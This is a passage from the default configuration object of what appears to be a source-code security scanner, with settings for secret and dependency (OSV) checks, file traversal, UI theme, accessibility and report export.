  minifiedLineLen: 2000,
  maxFindingsPerFile: 200,
  defaultRespectGitignore: true,
  defaultIncludeVendor: false,
  defaultCheckSecrets: true,
  defaultCheckDependencies: true,
  osvCacheDays: 7,
  osvConcurrency: 16,
  language: "ru",
  accent: "#5b8def",
  themePreset: "night",
  theme: {},
  density: "comfortable",
  reduceMotion: false,
  a11yUiScale: 100,
  a11yAlwaysFocus: false,
  a11yNoAmbient: false,
  a11ySeverityText: false,
  a11yUnderlineLinks: false,
  a11yBigTargets: false,
  maxHighlightLines: 6000,
  skipNoisyInTests: true,
  ignoreComments: true,
  followSymlinks: false,
  maxDepth: 0,
  excludeGlobs: "",
  enableBlame: true,
  blameMaxFiles: 800,
  offline: false,
  checkUpdates: false,
  externalTimeoutSecs: 300,
  historyCap: 60,
  reportOrg: "",
  defaultExportFormat: "json",
  codeFontSize: 13,
  tabWidth: 4,
  wrapCodeLines: false,
  editorCommand: "code -g {file}:{line}",
  keybinds: {},
};
